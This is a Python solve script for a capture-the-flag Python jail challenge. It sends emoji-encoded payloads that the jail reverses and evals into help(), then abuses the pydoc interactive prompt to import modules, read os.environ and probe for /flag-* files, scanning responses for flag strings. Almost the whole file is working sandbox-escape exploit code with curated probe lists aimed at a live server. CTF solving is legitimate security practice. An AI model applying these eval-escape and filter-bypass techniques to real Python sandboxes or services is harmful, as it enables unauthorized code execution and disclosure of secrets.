#!/usr/bin/env python3
# solve_flagjail_server.py
#
# Server-side probe/runner for flagjail.
#
# Status:
#   - Verified payload encoding for help(dict) and help().
#   - Verified challs.pyjail.club:25626 accepts the payload and opens pydoc help().
#   - This version does NOT rely on the local TTY pager trick, because remote is non-TTY.
#   - It tries the remaining usable primitive: help() -> pydoc interactive import/lookup.
#
# Usage:
#   python3 solve_flagjail_server.py challs.pyjail.club 25626 --check
#   python3 solve_flagjail_server.py challs.pyjail.club 25626 --probe
#   python3 solve_flagjail_server.py challs.pyjail.club 25626 --request __main__
#   python3 solve_flagjail_server.py challs.pyjail.club 25626 --request os
#
# If it finds something like jail{...}, it prints it clearly.

from __future__ import annotations

import argparse
import re
import socket
import sys
import time
from typing import Iterable

# Known-good payloads for this challenge.
# main.py translates regional-indicator flags to letters, reverses the string, then evals it.
PAYLOAD_HELP_DICT = ")🇹🇨🇮🇩(🇵🇱🇪🇭"   # -> help(dict)
PAYLOAD_HELP = ")(🇵🇱🇪🇭"             # -> help()

FLAG_RE = re.compile(rb"(?:jail|flag|pyjail|CTF)\{[^}\r\n]{1,200}\}", re.I)

DEFAULT_HELP_REQUESTS = [
    # Baseline/module state
    "__main__",
    "sys",
    "os",
    "os.environ",
    "flags",
    "builtins",
    "site",
    "pydoc",
    "linecache",
    "sysconfig",
    "platform",
    "tempfile",
    "glob",
    "fileinput",
    "runpy",
    "code",
    "pdb",

    # Paths / names worth checking. pydoc usually will NOT read these as files,
    # but this confirms behavior on the deployed image.
    "/flag-*",
    "../flag-*",
    "/app/run",
    "./run",
    "run",
    "flag",
    "flag.txt",

    # Import side-effect candidates seen in this Python 3.15 image / slim images.
    "this",
    "antigravity",
    "pip.__main__",
    "pip._vendor.certifi.__main__",
    "pip._vendor.distro.__main__",
    "pip._vendor.platformdirs.__main__",
    "pip._vendor.dependency_groups.__main__",
    "pip._vendor.pygments.__main__",
    "venv.__main__",
    "idlelib.__main__",
    "tkinter.__main__",
    "unittest.__main__",
    "test.__main__",
    "test.autotest",
]


def recv_all(sock: socket.socket, idle_timeout: float = 0.7, total_timeout: float = 8.0) -> bytes:
    """Read until the socket is idle for idle_timeout or total_timeout expires."""
    end = time.monotonic() + total_timeout
    last = time.monotonic()
    chunks: list[bytes] = []

    sock.setblocking(False)
    while True:
        now = time.monotonic()
        if now > end:
            break
        if chunks and now - last > idle_timeout:
            break
        try:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
            last = time.monotonic()
        except BlockingIOError:
            time.sleep(0.03)
        except TimeoutError:
            break
        except OSError:
            break
    return b"".join(chunks)


def connect(host: str, port: int, timeout: float) -> socket.socket:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    return s


def run_raw(host: str, port: int, lines: Iterable[str], timeout: float = 10.0) -> bytes:
    """
    Open one connection, send lines, half-close write side, then collect output.
    """
    payload = "".join(line if line.endswith("\n") else line + "\n" for line in lines)
    s = connect(host, port, timeout)
    out = b""
    try:
        # Read the first prompt when available.
        out += recv_all(s, idle_timeout=0.25, total_timeout=1.5)
        s.sendall(payload.encode("utf-8", "surrogatepass"))
        try:
            s.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        out += recv_all(s, idle_timeout=0.8, total_timeout=timeout)
    finally:
        s.close()
    return out


def run_help_request(host: str, port: int, request: str, timeout: float = 12.0) -> bytes:
    """
    Use help() as an unfiltered second-stage pydoc prompt:
        payload -> help()
        request -> pydoc lookup/import
        q       -> quit help
    """
    return run_raw(host, port, [PAYLOAD_HELP, request, "q"], timeout=timeout)


def print_output(title: str, out: bytes, max_bytes: int = 20000) -> bool:
    print(f"\n===== {title} =====")
    if len(out) > max_bytes:
        shown = out[:max_bytes] + b"\n...[truncated]...\n"
    else:
        shown = out
    text = shown.decode("utf-8", "replace")
    print(text)

    m = FLAG_RE.search(out)
    if m:
        print("\n[+] POSSIBLE FLAG FOUND:")
        print(m.group(0).decode("utf-8", "replace"))
        return True
    return False


def do_check(host: str, port: int, timeout: float) -> bool:
    print("[*] check 1/2: help(dict) payload")
    out1 = run_raw(host, port, [PAYLOAD_HELP_DICT], timeout=timeout)
    ok1 = print_output("help(dict)", out1)

    print("[*] check 2/2: help() -> __main__")
    out2 = run_help_request(host, port, "__main__", timeout=timeout)
    ok2 = print_output("help() / __main__", out2)

    if b"Help on class dict" in out1:
        print("[+] help(dict) reached eval successfully.")
    else:
        print("[-] help(dict) did not show expected output.")

    if b"help>" in out2 and (b"/app/run" in out2 or b"__main__" in out2):
        print("[+] help() interactive pydoc reached successfully.")
    else:
        print("[-] help() pydoc did not behave as expected.")

    return ok1 or ok2


def do_probe(host: str, port: int, timeout: float, delay: float, requests: list[str]) -> bool:
    print(f"[*] probing {len(requests)} pydoc requests")
    print("[*] NOTE: remote has JAIL_CONNS_PER_IP=2; keep --delay if you get connection issues.")
    found = False
    for idx, req in enumerate(requests, 1):
        print(f"\n[*] {idx}/{len(requests)} request={req!r}")
        try:
            out = run_help_request(host, port, req, timeout=timeout)
        except Exception as e:
            print(f"[-] connection/request failed for {req!r}: {type(e).__name__}: {e}")
            time.sleep(delay)
            continue

        if print_output(req, out, max_bytes=12000):
            found = True
            break
        time.sleep(delay)
    return found


def main() -> int:
    ap = argparse.ArgumentParser(description="flagjail server runner/prober")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--delay", type=float, default=1.0, help="delay between probe connections")
    ap.add_argument("--check", action="store_true", help="verify help(dict) and help() primitives")
    ap.add_argument("--probe", action="store_true", help="try curated pydoc import/lookup requests")
    ap.add_argument("--request", action="append", default=[], help="single pydoc request; can repeat")
    ap.add_argument("--requests-file", help="file containing one pydoc request per line")
    args = ap.parse_args()

    requests = list(args.request)
    if args.requests_file:
        with open(args.requests_file, "r", encoding="utf-8") as f:
            requests.extend(line.strip() for line in f if line.strip() and not line.lstrip().startswith("#"))

    any_found = False

    if args.check or (not args.probe and not requests):
        any_found |= do_check(args.host, args.port, args.timeout)

    if args.probe:
        any_found |= do_probe(args.host, args.port, args.timeout, args.delay, DEFAULT_HELP_REQUESTS)

    if requests:
        any_found |= do_probe(args.host, args.port, args.timeout, args.delay, requests)

    if any_found:
        return 0

    print("\n[-] No flag-like token found in the outputs.")
    print("[!] This confirms the known server issue: remote is non-TTY, so the old help(dict) pager escape is not usable.")
    print("[!] Current remaining path is finding a pydoc import/lookup side effect that reads /flag-*.")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
